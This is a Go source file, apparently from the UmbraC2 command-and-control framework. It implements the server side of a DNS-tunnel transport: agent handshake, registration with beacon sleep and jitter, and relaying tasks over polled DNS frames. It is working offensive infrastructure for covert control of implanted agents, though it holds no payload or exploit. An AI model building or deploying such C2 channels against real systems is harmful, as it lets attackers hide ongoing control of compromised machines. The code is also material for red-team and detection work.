package link

import (
	"errors"
	"fmt"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/dnstun"
)

// The timing of the DNS transport.  The agent polls the tunnel with the
// sleep interval of its beacon, so the write timeout has to be generous.
const (
	// DNSWriteTimeout is how long a write waits for the agent to pick the
	// previous frame up.
	DNSWriteTimeout = 30 * time.Second
	// DNSWritePoll is the pause between two attempts.
	DNSWritePoll = 25 * time.Millisecond
)

// dnsStream carries frames over a DNS tunnel.
//
// The tunnel is a request/response transport: the agent polls and the answer
// carries the next frame.  Everything above the transport -- the handshake,
// the session state machine, the task queue -- is the same as on TCP, which
// is the whole point of the FrameStream abstraction.
type dnsStream struct {
	ch *dnstun.Channel
}

// ReadFrame waits for the next frame the agent sent.
func (s *dnsStream) ReadFrame() ([]byte, error) {
	frame, ok := s.ch.Next()
	if !ok {
		return nil, errors.New("the dns tunnel channel is closed")
	}
	return frame, nil
}

// WriteFrame queues a frame for the agent.
//
// The tunnel carries one frame at a time: while a frame waits for the next
// query of the agent, another frame cannot be queued.  The write waits for
// the agent to pick the frame up instead of dropping it.
func (s *dnsStream) WriteFrame(frame []byte) error {
	deadline := time.Now().Add(DNSWriteTimeout)
	for {
		err := s.ch.Send(frame)
		if err == nil {
			return nil
		}
		if !errors.Is(err, dnstun.ErrBusy) {
			return err
		}
		if time.Now().After(deadline) {
			return errors.New("the dns tunnel did not drain the previous frame")
		}
		time.Sleep(DNSWritePoll)
	}
}

// ServeDNS runs the session of an agent that talks to the DNS tunnel.
//
// The agent sends its HELLO in the first query; the handshake then runs over
// the tunnel exactly like it runs over a socket.
func (s *Server) ServeDNS(agentID string, ch *dnstun.Channel) {
	log := s.Log.With("peer", agentID, "transport", "dns")
	defer ch.Close()

	stream := &dnsStream{ch: ch}
	sess, info, err := Handshake(stream, s.Cfg, s.Keys, log, agentID)
	if err != nil {
		log.Warn("handshake failed", "err", err)
		return
	}
	if info.Role != crypt.RoleAgent {
		log.Warn("operator key used on the tunnel", "id", info.ID)
		return
	}

	sleep, jitter := s.Cfg.Server.Beacon.Sleep, s.Cfg.Server.Beacon.Jitter
	meta := AgentMeta(info, "dns", agentID, sleep, jitter)
	rec, _, err := s.Hub.RegisterAgent(meta, "dns", agentID, info.Suite, info.SessionID)
	if err != nil {
		log.Warn("agent registration refused", "err", err)
		return
	}
	defer s.Hub.UnregisterSession(rec.ID, fmt.Sprintf("%x", info.SessionID))

	link := &AgentLink{Hub: s.Hub, Session: sess, AgentID: rec.ID, Transport: "dns", Log: s.Log, Keys: s.Keys}
	budget := int64(s.Cfg.Server.Limits.MaxFrameBytesPerConn)
	for {
		raw, err := stream.ReadFrame()
		if err != nil {
			log.Debug("agent read ended", "err", err)
			return
		}
		budget -= int64(len(raw))
		if budget < 0 {
			log.Warn("agent exceeded frame budget", "agent", rec.ID)
			return
		}
		out, err := link.HandleFrame(raw)
		if err != nil {
			log.Warn("agent frame rejected", "agent", rec.ID, "err", err)
			return
		}
		for _, f := range out {
			if err := stream.WriteFrame(f); err != nil {
				log.Debug("agent write failed", "err", err)
				return
			}
		}
		if link.Closed() {
			log.Info("agent closed session", "agent", rec.ID)
			return
		}
	}
}
